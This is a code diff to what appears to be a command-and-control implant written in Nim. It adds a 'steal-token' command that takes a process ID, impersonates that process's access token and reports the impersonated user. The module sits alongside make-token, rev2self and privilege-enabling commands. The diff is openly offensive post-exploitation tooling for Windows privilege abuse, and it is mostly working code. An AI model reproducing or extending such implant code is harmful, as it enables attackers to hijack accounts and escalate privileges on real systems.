@@ -2,6 +2,7 @@ import ../common/[types, utils]
 
 # Define function prototype
 proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult 
+proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult 
 proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult 
 proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult 
 proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult 
@@ -25,6 +26,16 @@ let module* = Module(
                 Argument(name: protect("logonType"), description: protect("Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)."), argumentType: INT, isRequired: false)
             ],
             execute: executeMakeToken
+        ),
+        Command(
+            name: protect("steal-token"),
+            commandType: CMD_STEAL_TOKEN,
+            description: protect("Steal the primary access token of a remote process."),
+            example: protect("steal-token 1234"),
+            arguments: @[
+                Argument(name: protect("pid"), description: protect("Process ID of the target process."), argumentType: INT, isRequired: true),
+            ],
+            execute: executeStealToken
         ),
         Command(
             name: protect("rev2self"),
@@ -68,6 +79,7 @@ let module* = Module(
 # Implement execution functions
 when not defined(agent):
     proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = nil 
@@ -84,7 +96,6 @@ when defined(agent):
         try: 
             echo fmt"   [>] Creating access token from username and password."
             
-            var success: bool
             var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
             var  
                 username = Bytes.toString(task.args[0].data)
@@ -106,6 +117,18 @@ when defined(agent):
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
+    proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult = 
+        try: 
+            echo fmt"   [>] Stealing access token."
+
+            let pid = int(Bytes.toUint32(task.args[0].data))       
+            let username  = stealToken(pid)
+
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
+
+        except CatchableError as err: 
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
     proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             echo fmt"   [>] Reverting access token."
